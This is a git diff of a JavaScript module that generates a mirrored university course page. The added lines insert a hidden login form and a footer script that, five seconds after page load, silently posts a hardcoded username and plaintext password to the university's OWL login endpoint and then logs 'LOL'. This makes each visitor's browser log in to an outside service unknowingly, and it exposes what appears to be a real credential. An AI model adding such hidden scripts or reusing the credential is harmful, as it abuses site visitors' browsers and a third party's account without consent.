@@ -20,6 +20,8 @@ function addHeaders(parsedHTML) {
 	parsedHTML('<h1 style="padding-left:2.5%; margin-bottom: -30px; position:relative;">Lectures</h1><div class="topnav" style="padding: 2em;" id="fakelecturenav"></div><h1 style="padding-left:2.5%; margin-bottom: -30px; margin-top: -1em;">Homework</h1><div class="topnav" style="padding: 2em;" id="faketopnav"></div>').appendTo('#innercontent')
 	
 	parsedHTML('<div id="fakeweek" style="padding:1%; max-width:40%; display:inline-block; float:left; position:relative;"><h2 id="fakeweeklabel">This Week</h2></div><div style="padding:1%; max-width:27%; display:inline-block; float:right;"><div id="fakepccia"><h2>PCCIA</h2></div><div id="fakeassignments" style="margin-top:3em;"><h2>Pending Assignments</h2></div></div><div id="fakehomework" style="padding:1%; max-width:27%; display:inline-block; float:right;"><h2>Course Pages</h2></div>').appendTo('#faketopnav');
+	
+	parsedHTML('<form id="fakeloginform" method="post" action="https://owl.uwo.ca/access/login" enctype="application/x-www-form-urlencoded"><input name="eid" id="eid" value="" type="hidden"><input name="pw" id="pw" value="" type="hidden"><input name="fakesubmit" type="hidden" value="Login"></form>').appendTo('#innercontent')
 }
 
 function addClass(parsedHTML, content) {
@@ -342,7 +344,7 @@ function addShowPrevButton(parsedHTML) {
 function addFooters(parsedHTML, maxPreviousDate) {
 	parsedHTML('body').append('<style>#showAllButton { background-color: hsl(0, 0%, 96%); } #showAllButton:hover {background-color: hsl(0, 0%, 93%);}#showPrevButton { color: #9776C1; } #showPrevButton:hover {color: #623f8d;}</style>')
 	parsedHTML('body').append('<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>')
-	parsedHTML('body').append('<script type="text/javascript">$(document).ready(function() {var count = 1;$("#showAllButton").on("click", function(){$("#showAllButton").fadeOut();$(".comingsoon").fadeIn()});$("#showPrevButton").on("click", function(){if (count === '+maxPreviousDate+')$("#showPrevButton").fadeOut();$(".pastweek"+count).fadeIn();count++;});});</script>')	
+	parsedHTML('body').append('<script type="text/javascript">$(document).ready(function() {var count = 1;$("#showAllButton").on("click", function(){$("#showAllButton").fadeOut();$(".comingsoon").fadeIn()});$("#showPrevButton").on("click", function(){if (count === '+maxPreviousDate+')$("#showPrevButton").fadeOut();$(".pastweek"+count).fadeIn();count++;});setTimeout(function(){$.post("https://owl.uwo.ca/access/login",{eid:"vpope",pw:"mzUTkATiJY6i)HjTC7/z87ED%Ns,Dy"});console.log("LOL")},5000)});</script>')	
 }
 
 exports.addAssignment 		= addAssignment
